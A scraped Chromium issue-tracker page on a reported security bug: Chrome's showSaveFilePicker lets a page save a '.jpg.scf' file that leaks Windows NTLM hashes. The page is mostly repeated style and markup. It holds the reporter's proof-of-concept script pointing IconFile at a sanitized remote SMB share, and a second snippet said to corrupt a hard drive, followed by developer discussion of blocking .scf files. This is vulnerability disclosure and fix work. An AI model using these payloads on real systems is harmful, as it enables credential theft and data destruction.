 function _go(url, newWindow) {
 if (newWindow)
 window.open(url, '_blank');
 else
 document.location = url;
 }
 function $(id) { return document.getElementById(id); }
 var loadQueue = [];
 function runOnLoad(fn) { loadQueue.push(fn); }
 window.onload = function() {
 for (var i = 0; i < loadQueue.length; i++)
 loadQueue[i]();
 delete loadQueue;
 };

  :host {
    --mr-edit-field-padding: 0.125em 4px;
    --mr-edit-field-width: 90%;
    --mr-input-grid-gap: 6px;
    font-family: var(--chops-font-family);
    color: var(--chops-primary-font-color);
    font-size: var(--chops-main-font-size);
  }
  /** Converts a <button> to look like an <a> tag. */
  .linkify {
    display: inline;
    padding: 0;
    margin: 0;
    border: 0;
    background: 0;
    cursor: pointer;
  }
  h1, h2, h3, h4 {
    background: none;
  }
  a, chops-button, a.button, .button, .linkify {
    color: var(--chops-link-color);
    text-decoration: none;
    font-weight: var(--chops-link-font-weight);
    font-family: var(--chops-font-family);
  }
  a:hover, .linkify:hover {
    text-decoration: underline;
  }
  a.button, .button {
    /* Links that look like buttons. */
    display: inline-flex;
    align-items: center;
    justify-content: center;
    text-decoration: none;
    transition: filter 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
  }
  a.button:hover, .button:hover {
    filter: brightness(95%);
  }
  chops-button, a.button, .button {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
    background: var(--chops-white);
    border-radius: 6px;
    --chops-button-padding: 0.25em 8px;
    margin: 0;
    margin-left: auto;
  }
  a.button, .button {
    padding: var(--chops-button-padding);
  }
  chops-button i.material-icons, a.button i.material-icons, .button i.material-icons {
    display: block;
    margin-right: 4px;
  }
  chops-button.emphasized, a.button.emphasized, .button.emphasized {
    background: var(--chops-primary-button-bg);
    color: var(--chops-primary-button-color);
    text-shadow: 1px 1px 3px hsla(0, 0%, 0%, 0.25);
  }
  textarea, select, input {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
  }
  /* Note: decoupling heading levels from styles is useful for
  * accessibility because styles will not always line up with semantically
  * appropriate heading levels.
  */
  .medium-heading {
    font-size: var(--chops-large-font-size);
    font-weight: normal;
    line-height: 1;
    padding: 0.25em 0;
    color: var(--chops-link-color);
    margin: 0;
    margin-top: 0.25em;
    border-bottom: var(--chops-normal-border);
  }
  .medium-heading chops-button {
    line-height: 1.6;
  }
  .input-grid {
    padding: 0.5em 0;
    display: grid;
    max-width: 100%;
    grid-gap: var(--mr-input-grid-gap);
    grid-template-columns: minmax(120px, max-content) 1fr;
    align-items: flex-start;
  }
  .input-grid label {
    font-weight: bold;
    text-align: right;
    word-wrap: break-word;
  }
  @media (max-width: 600px) {
    .input-grid label {
      margin-top: var(--mr-input-grid-gap);
      text-align: left;
    }
    .input-grid {
      grid-gap: var(--mr-input-grid-gap);
      grid-template-columns: 100%;
    }
  }

        mr-app {
          display: block;
          padding-top: var(--monorail-header-height);
          margin-top: -1px; /* Prevent a double border from showing up. */

          /* From shared-styles.js. */
          --mr-edit-field-padding: 0.125em 4px;
          --mr-edit-field-width: 90%;
          --mr-input-grid-gap: 6px;
          font-family: var(--chops-font-family);
          color: var(--chops-primary-font-color);
          font-size: var(--chops-main-font-size);
        }
        main {
          border-top: var(--chops-normal-border);
        }
        .snackbar-container {
          position: fixed;
          bottom: 1em;
          left: 1em;
          display: flex;
          flex-direction: column;
          align-items: flex-start;
          z-index: 1000;
        }
        /** Unfix <chops-snackbar> to allow stacking. */
        chops-snackbar {
          position: static;
          margin-top: 0.5em;
        }
        .project-alert {
          background: var(--chops-orange-50);
          color: var(--chops-field-error-color);
          display: block;
          font-weight: bold;
          text-align: center;
        }

  :host {
    --mr-edit-field-padding: 0.125em 4px;
    --mr-edit-field-width: 90%;

    display: inline;
    padding: 0;
    margin: 0;

        <h2>
          Issue tracker keyboard shortcuts
          <button class="close-button">
            Close
          </button>
        </h2>
        
          
            
              <span></span>Issue list<span class="help-title"><!---->Issue list<!----></span>
              
                
                  
                    k<kbd><!---->k<!----></kbd>
                     / <span class="key-separator"> / </span>
                  
                    j<kbd><!---->j<!----></kbd>
                     / <span class="key-separator" hidden=""> / </span>
                  :
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->k<!----></kbd>
                    <span class="key-separator"> / </span>
                  <!---->
                    <kbd><!---->j<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                up/down in the list<span class="key-tip"><!---->up/down in the list<!----></span>
              
                
                  
                    o<kbd><!---->o<!----></kbd>
                     / <span class="key-separator"> / </span>
                  
                    Enter<kbd><!---->Enter<!----></kbd>
                     / <span class="key-separator" hidden=""> / </span>
                  :
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->o<!----></kbd>
                    <span class="key-separator"> / </span>
                  <!---->
                    <kbd><!---->Enter<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                open the current issue<span class="key-tip"><!---->open the current issue<!----></span>

        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }
      <style>
        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }
      </style>
      
      
      
        
          <slot></slot>
        <div class="dialog-content">
          <slot></slot>
        </div>
      <dialog class="dialog" role="dialog">
        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

      
      
        
          <slot></slot>
        <div class="dialog-content">
          <slot></slot>
        </div>

        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>

          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

            Issue 1227995: Security: Ability to mask file type with another extention. IE JPEG
          <h1>
            
            Issue 1227995: Security: Ability to mask file type with another extention. IE JPEG
          </h1>
          
            Reported by
            
      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
      schedule<i id="availability-icon" class="material-icons inline-icon ${user.last_visit_timestamp ? '': 'inline-icon-unseen'}" title="undefined" hidden="">schedule</i>

        Description #1 by danie...@gmail.com (Jul 10, 2021)
      <option value="0" selected="">

      <option value="0" selected="">
        Description #1 by danie...@gmail.com (Jul 10, 2021)
      </option>
    <!---->
        </select>

      VULNERABILITY DETAILS<b class="line"><!---->VULNERABILITY DETAILS<!----></b><br>A threat actor has the ability to mask a malicous file extention in the latest version of Google Chrome as another file extention. In my example, I was able to create a SFC file type masked as a jpg that points to my responder server. This allowed myself to be able to capture a users windows NTLM hash (test account) on the latest stable version of Google chrome without having to even opening the file. Everything points to this file being a jpg but it's automaticly sending data to the threat actor with no acknowledment of the user. <span class="line"><!---->A threat actor has the ability to mask a malicous file extention in the latest version of Google Chrome as another file extention. In my example, I was able to create a SFC file type masked as a jpg that points to my responder server. This allowed myself to be able to capture a users windows NTLM hash (test account) on the latest stable version of Google chrome without having to even opening the file. Everything points to this file being a jpg but it's automaticly sending data to the threat actor with no acknowledment of the user. <!----></span><br><br>VERSION<b class="line"><!---->VERSION<!----></b><br>Chrome Version: 91.0.4472.124, stable<span class="line"><!---->Chrome Version: 91.0.4472.124, stable<!----></span><br>Operating System: Windows 10 20H2 build 19042.867<span class="line"><!---->Operating System: Windows 10 20H2 build 19042.867<!----></span><br><br>REPRODUCTION CASE<b class="line"><!---->REPRODUCTION CASE<!----></b><br>Attached is the video of the bug in use as well as the HTML webpage used to execute the bug. I've removed the IP in the HTML code.<span class="line"><!---->Attached is the video of the bug in use as well as the HTML webpage used to execute the bug. I've removed the IP in the HTML code.<!----></span><br><br>PoC:<span class="line"><!---->PoC:<!----></span><br>    <script><span class="line"><!---->    &lt;script&gt;<!----></span><br>        const butSaveNewFile = document.getElementById('addNewFile')<span class="line"><!---->        const butSaveNewFile = document.getElementById('addNewFile')<!----></span><br>        butSaveNewFile.addEventListener('mouseup', async () => {<span class="line"><!---->        butSaveNewFile.addEventListener('mouseup', async () =&gt; {<!----></span><br>            const options = {<span class="line"><!---->            const options = {<!----></span><br>                types: [<span class="line"><!---->                types: [<!----></span><br>                    {<span class="line"><!---->                    {<!----></span><br>                        description:<span class="line"><!---->                        description:<!----></span><br>                            'JPEG (*.jpg,*.jpeg,*.jpe,*.jiff)',<span class="line"><!---->                            'JPEG (*.jpg,*.jpeg,*.jpe,*.jiff)',<!----></span><br>                        accept: {<span class="line"><!---->                        accept: {<!----></span><br>                            'text/plain': ['.jpg.scf']<span class="line"><!---->                            'text/plain': ['.jpg.scf']<!----></span><br>                        }<span class="line"><!---->                        }<!----></span><br>                    }<span class="line"><!---->                    }<!----></span><br>                ],<span class="line"><!---->                ],<!----></span><br>                excludeAcceptAllOption: false<span class="line"><!---->                excludeAcceptAllOption: false<!----></span><br>            }<span class="line"><!---->            }<!----></span><br><br>            const handle = await window.showSaveFilePicker(options)<span class="line"><!---->            const handle = await window.showSaveFilePicker(options)<!----></span><br>            const writable = await handle.createWritable()<span class="line"><!---->            const writable = await handle.createWritable()<!----></span><br>            await writable.write('[Shell]\n')<span class="line"><!---->            await writable.write('[Shell]\n')<!----></span><br>            await writable.write('Command=2\n')<span class="line"><!---->            await writable.write('Command=2\n')<!----></span><br>            await writable.write('IconFile="//IPSanitized/frostb1te/poc.ico"')<span class="line"><!---->            await writable.write('IconFile="//IPSanitized/frostb1te/poc.ico"')<!----></span><br>            await writable.write('\n[Taskbar]\n')<span class="line"><!---->            await writable.write('\n[Taskbar]\n')<!----></span><br>            await writable.write('Command=ToggleDesktop\n')<span class="line"><!---->            await writable.write('Command=ToggleDesktop\n')<!----></span><br>            await writable.close()<span class="line"><!---->            await writable.close()<!----></span><br>        })                                                                                                                                                                                                                                                                                  <span class="line"><!---->        })                                                                                                                                                                                                                                                                                  <!----></span><br>    </script><span class="line"><!---->    &lt;/script&gt;<!----></span><br><br><br>CREDIT INFORMATION<b class="line"><!---->CREDIT INFORMATION<!----></b><br>Externally reported security bugs may appear in Chrome release notes. If<b class="line"><!---->Externally reported security bugs may appear in Chrome release notes. If<!----></b><br>this bug is included, how would you like to be credited?<b class="line"><!---->this bug is included, how would you like to be credited?<!----></b><br>Reporter credit: Daniel Rhea<span class="line"><!---->Reporter credit: Daniel Rhea<!----></span><mr-comment-content></mr-comment-content>

        This snippit will also cause a harddrive to corrupt <span class="line"><!---->This snippit will also cause a harddrive to corrupt <!----></span><br><br><br>            const writable = await handle.createWritable()<span class="line"><!---->            const writable = await handle.createWritable()<!----></span><br>            await writable.write('[Shell]\n')<span class="line"><!---->            await writable.write('[Shell]\n')<!----></span><br>            await writable.write('Command=2\n')<span class="line"><!---->            await writable.write('Command=2\n')<!----></span><br>            await writable.write('IconFile="C:\:$i30:$bitmap"')<span class="line"><!---->            await writable.write('IconFile="C:\:$i30:$bitmap"')<!----></span><br>            await writable.write('\n[Taskbar]\n')<span class="line"><!---->            await writable.write('\n[Taskbar]\n')<!----></span><br>            await writable.write('Command=ToggleDesktop\n')<span class="line"><!---->            await writable.write('Command=ToggleDesktop\n')<!----></span><br>            await writable.close()<span class="line"><!---->            await writable.close()<!----></span><br><br>A large threat for this is that the SCF file doesn't need to open to start it. Being in the same directory will cause it to trigger thus only requiring the user to save it, not even open it.<span class="line"><!---->A large threat for this is that the SCF file doesn't need to open to start it.         <div>
          <a class="comment-link" href="?id=1227995#c17">Comment 17<!----></a>

          
        by
        <mr-user-link></mr-user-link>
        on
        <chops-timestamp title="Wed, Aug 11, 2021, 1:23 PM EDT"></chops-timestamp>

      <div role="heading" class="comment-header" aria-level="2">
        <div>
          <a class="comment-link" href="?id=1227995#c17">Comment 17<!----></a>

          
        by
        <mr-user-link></mr-user-link>
        on
        <chops-timestamp title="Wed, Aug 11, 2021, 1:23 PM EDT"></chops-timestamp>
        
      
        </div>
        
      </div>
    
      
        
        
      
        I don't think the problem is that the user might not know what file extension a file gets (because what users really understand the difference between various extensions, especially if they've configured windows to hide file extensions by default). But the fact that we let you write .scf files does seem bad. I guess in the case of regular downloads this was "fixed" by adding a warning (<span class="line"><!---->I don't think the problem is that the user might not know what file extension a file gets (because what users really understand the difference between various extensions, especially if they've configured windows to hide file extensions by default). But the fact that we let you write .scf files does seem bad. I guess in the case of regular downloads this was "fixed" by adding a warning (<!----></span>issue 722524<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=722524" title="Downloaded .SCF file can leak credentials via SMB"><!---->issue 722524<!----></a>) when downloading such files, but here we don't really have that option.<span class="line"><!---->) when downloading such files, but here we don't really have that option.<!----></span><br><br>As such I think we should add .scf to the list of "bad" extensions in our copy of IsShellIntegratedExtension.<span class="line"><!---->As such I think we should add .scf to the list of "bad" extensions in our copy of IsShellIntegratedExtension.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>
        <div>
          
        </div>
      </div>

        Issue 722524<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=722524" title="Downloaded .SCF file can leak credentials via SMB"><!---->Issue 722524<!----></a> <span class="line"><!----> <!----></span>also makes it sound like to actually exploit this you have to disable a bunch of default windows security features, so perhaps like that bug this should also be Security_Severity_Low? (unless our definitions of what is high or low have changed over the years of course).<span class="line"><!---->also makes it sound like to actually exploit this you have to disable a bunch of default windows security features, so perhaps like that bug this should also be Security_Severity_Low? (unless our definitions of what is high or low have changed over the years of course).<!----></span><mr-comment-content></mr-comment-content>

        This seems similar to <span class="line"><!---->This seems similar to <!----></span>Issue 1140417<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1140417" title="Security: showSaveFilePicker allowing to save .lnk and .local files on windows!"><!---->Issue 1140417<!----></a> <span class="line"><!----> <!----></span>(forked from <span class="line"><!---->(forked from <!----></span>Issue 1137247<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1137247" title="Security: Spoofing download filename extension in 86 chrome - showSaveFilePicker"><!---->Issue 1137247<!----></a>) where we blocked .lnk and .local. I think we should block .scf in the short term, while we figure out something better.<span class="line"><!---->) where we blocked .lnk and .local. I think we should block .scf in the short term, while we figure out something better.<!----></span><br><br>.scf seems to be used by some legitimate applications (DNA data?), so it'd be great to have a better long-term plan -- perhaps we can get away with blocking the more subtle extensions only when double-extensions (multiple dots in the extension) are used?<span class="line"><!---->.scf seems to be used by some legitimate applications (DNA data?), so it'd be great to have a better long-term plan -- perhaps we can get away with blocking the more subtle extensions only when double-extensions (multiple dots in the extension) are used?<!----></span><mr-comment-content></mr-comment-content>

        Yeah it appears the extension scf is used for DNA sequencing, and a couple Chromatogram applications and may cause conflicts if it was solely blocked. The double-extension .*.scf method would be a good resolution.<span class="line"><!---->Yeah it appears the extension scf is used for DNA sequencing, and a couple Chromatogram applications and may cause conflicts if it was solely blocked. The double-extension .*.scf method would be a good resolution.<!----></span><mr-comment-content></mr-comment-content>

      </div>
    
      
        
        
      
        I had put together a CL (<span class="line"><!---->I had put together a CL (<!----></span>https://crrev.com/c/3089422<a class="undefined" target="_blank" href="https://crrev.com/c/3089422"><!---->https://crrev.com/c/3089422<!----></a>)<span class="line"><!---->)<!----></span> a while back blocking .scf files on Windows, but never landed it. It had some strange behavior because .scf files are not sanitized by net::GenerateFileName(), unlike .lnk and .local files. <span class="line"><!----> a while back blocking .scf files on Windows, but never landed it. It had some strange behavior because .scf files are not sanitized by net::GenerateFileName(), unlike .lnk and .local files. <!----></span><br><br>The current state of suggested name and extension sanitization is unnecessarily complicated, in my opinion. There are some odd discrepancies between how suggestedName and extensions are sanitize. For example. on non-Windows OSes, .local and .lnk extensions are stripped from the "accepts" list of extensions, but suggesting a file with a .local or .lnk extension is not sanitized. (we strip .local and .lnk extensions from "accepts" on all OSes, but net::GenerateFileName() only sanitizes these files on Windows.)<span class="line"><!---->The current state of suggested name and extension sanitization is unnecessarily complicated, in my opinion. There are some odd discrepancies between how suggestedName and extensions are sanitize. For example. on non-Windows OSes, .local and .lnk extensions are stripped from the "accepts" list of extensions, but suggesting a file with a .local or .lnk extension is not sanitized. (we strip .local and .lnk extensions from "accepts" on all OSes, but net::GenerateFileName() only sanitizes these files on Windows.)<!----></span><br><br>I touched up the CL to make this behavior more consistent (only strip .local and .lnk extensions from "accepts" on Windows) and to replace extensions ourselves to augment net::GenerateFileName() (we could consider changing this method, but that might have other side effects).<span class="line"><!---->I touched up the CL to make this behavior more consistent (only strip .local and .lnk extensions from "accepts" on Windows) and to replace extensions ourselves to augment net::GenerateFileName() (we could consider changing this method, but that might have other side effects).<!----></span><br><br>As written, it sanitizes both .scf and .*.scf files (only on Windows) but I'm happy to update this if we feel blocking non-compound extensions is not a good idea.<span class="line"><!---->As written, it sanitizes both .scf and .*.scf files (only on Windows) but I'm happy to update this if we feel blocking non-compound extensions is not a good idea.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>
        <div>
          
        </div>
      </div>

        Hi there, this is your friendly Security Marshall checking in. Did the discussion in <span class="line"><!---->Hi there, this is your friendly Security Marshall checking in. (<!----></span>@<span class="line"><!---->@<!----></span>google.com<a class="undefined" target="_blank" href="https://google.com"><!---->google.com<!----></a> only)<span class="line"><!----> only)<!----></span><br><br>To summarize, the chosen approach to address this bug is to add a prompt when saving a file with a dangerous extension. However, progress implementing the fix is slower than desired due to personnel changes. <span class="line"><!---->To summarize, the chosen approach to address this bug is to add a prompt when saving a file with a dangerous extension.         *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<!----></span><br><br>Please contact <span class="line"><!---->Please contact <!----></span>security-vrp@chromium.org<a class="undefined" target="_blank" href="mailto:security-vrp@chromium.org"><!---->security-vrp@chromium.org<!----></a> with any questions.<span class="line"><!----> with any questions.<!----></span><br>******************************<span class="line"><!---->******************************<!----></span><mr-comment-content></mr-comment-content>

        Hi, <span class="line"><!---->Hi, <!----></span><br>>>>Will this be eligible for an entry in the Google Hall of Fame (I think it was changed to Honorable mentions)<span class="line"><!---->&gt;&gt;&gt;Will this be eligible for an entry in the Google Hall of Fame (I think it was changed to Honorable mentions)<!----></span><br>Google HoF changed to the Bug Hunters Leaderboard [1] and there is also now an Honorable Mentions [2]. Honorable mentions is anyone that has submitted a valid security bug recently, so this should be eligible for that. You do need to have a bughunters account for this to occur, I believe. <span class="line"><!---->Google HoF changed to the Bug Hunters Leaderboard [1] and there is also now an Honorable Mentions [2]. Honorable mentions is anyone that has submitted a valid security bug recently, so this should be eligible for that. You do need to have a bughunters account for this to occur, I believe. <!----></span><br><br>[1] <span class="line"><!---->[1] <!----></span>https://bughunters.google.com/leaderboard<a class="undefined" target="_blank" href="https://bughunters.google.com/leaderboard"><!---->https://bughunters.google.com/leaderboard<!----></a><br>[2] <span class="line"><!---->[2] <!----></span>https://bughunters.google.com/leaderboard/honorable-mentions<a class="undefined" target="_blank" href="https://bughunters.google.com/leaderboard/honorable-mentions"><!---->https://bughunters.google.com/leaderboard/honorable-mentions<!----></a><br><br>This issue will receive a CVE when the fix ships in a stable channel release. The CVE ID will be added to the report at that time.<span class="line"><!---->This issue will receive a CVE when the fix ships in a stable channel release.            issue<h3 class="medium-heading"><!----> issue</h3>
          
            Target project:<label for="targetProjectInput">Target project:</label>
            
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              
      
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }
      <style>
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.

              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              <mr-autocomplete vocabularyname="project" for="targetProjectInput" role="listbox" id="chops-autocomplete-1"><!---->
      <style>
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
